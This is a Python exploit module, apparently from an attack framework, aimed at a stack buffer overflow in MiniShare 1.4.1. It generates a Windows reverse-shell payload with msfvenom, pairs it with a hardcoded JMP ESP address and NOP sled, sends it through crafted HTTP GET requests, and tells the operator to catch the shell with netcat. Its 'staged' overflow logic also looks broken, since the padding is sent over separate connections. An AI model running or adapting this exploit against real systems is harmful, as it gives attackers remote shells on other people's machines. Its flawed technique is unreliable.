import os,sys
project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
lib_path = os.path.join(project_root, "lib")
sys.path.insert(0, lib_path)
import socket
import time
import struct
import threading
from colorama import Fore,init
init(autoreset=True)
import fcntl
def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)  # 加锁
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)  # 解锁

class Module:
    def __init__(self):
        self.name = "Precise MiniShare 1.4.1 Stack Buffer Overflow (Staged Fill)"
        self.port = 80                # MiniShare 默认端口，也可能是 8080
        self.protocol = "tcp"
        self.platform = "windows"
        self.use_msf = False
        self.buffer_total_size = 2000  # 缓冲区大小（大于覆盖 EIP 所需）
        self.eip_offset = 1787         # 覆盖 EIP 的精确偏移
        self.jmp_esp_address = 0x7C9D30D7
        self.shellcode_port = 4444

    def exploit(self, target_ip=None, target_port=80, lhost=None):
        if lhost is None:
            return False, "需要提供 LHOST 用于反弹 Shell"

        safe_print(f"{Fore.GREEN}[*] 目标: {target_ip}:{target_port}, 使用分步精确缓冲区溢出...")

        # 1. 生成反弹 Shell 的 Shellcode
        shellcode = self._generate_reverse_shellcode(lhost, self.shellcode_port)
        if not shellcode:
            return False, "Shellcode 生成失败"

        # 2. 分步填充缓冲区
        if not self._staged_overflow(target_ip, target_port, shellcode):
            return False, "分步溢出攻击失败"

        # 3. 等待反弹 Shell
        safe_print(f"{Fore.GREEN}[+] 溢出已触发，请确保已用 nc -lvp {self.shellcode_port} 监听")
        return True, f"反弹 Shell 应连接至 {lhost}:{self.shellcode_port}"

    def _generate_reverse_shellcode(self, lhost, lport):
        """使用 msfvenom 生成 Windows 反弹 Shellcode，若失败则返回 None"""
        import subprocess
        try:
            cmd = [
                "msfvenom", "-p", "windows/shell_reverse_tcp",
                f"LHOST={lhost}", f"LPORT={lport}",
                "-f", "python", "-b", "\x00\x0a\x0d"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode != 0:
                safe_print(f"[-] msfvenom 错误: {result.stderr}")
                return None
            # 解析 Python 格式的 shellcode
            shellcode_str = result.stdout.strip()
            exec_locals = {}
            exec(shellcode_str, {}, exec_locals)
            return exec_locals.get('buf', None)
        except Exception as e:
            safe_print(f"[-] 生成 Shellcode 失败: {e}")
            return None

    def _staged_overflow(self, target_ip, target_port, shellcode):
        try:
            safe_print("[*] 第一步：发送 1000 字节填充数据...")
            sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock1.settimeout(5)
            sock1.connect((target_ip, target_port))
            payload1 = b"A" * 1000
            request1 = f"GET /index.html?{payload1.decode()} HTTP/1.0\r\n\r\n"
            sock1.send(request1.encode())
            sock1.close()
            time.sleep(0.5)  # 给服务端处理时间

            safe_print("[*] 第二步：发送 787 字节填充数据，达到 EIP 边界...")
            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock2.settimeout(5)
            sock2.connect((target_ip, target_port))
            payload2 = b"A" * 787
            request2 = f"GET /index.html?{payload2.decode()} HTTP/1.0\r\n\r\n"
            sock2.send(request2.encode())
            sock2.close()
            time.sleep(0.5)

            safe_print("[*] 第三步：发送最终 payload，覆盖 EIP 并注入 Shellcode...")
            sock3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock3.settimeout(5)
            sock3.connect((target_ip, target_port))

            eip = struct.pack("<I", self.jmp_esp_address)
            nop_sled = b"\x90" * 20
            final_payload = eip + nop_sled + shellcode

            max_len = self.buffer_total_size - self.eip_offset - 4
            if len(final_payload) > max_len:
                final_payload = final_payload[:max_len]

            request3 = f"GET /index.html?{final_payload.decode('latin1')} HTTP/1.0\r\n\r\n"
            sock3.send(request3.encode())
            sock3.close()

            safe_print("[+] 分步填充完成，漏洞应已触发")
            return True

        except Exception as e:
            safe_print(f"[-] 溢出过程出错: {e}")
            return False
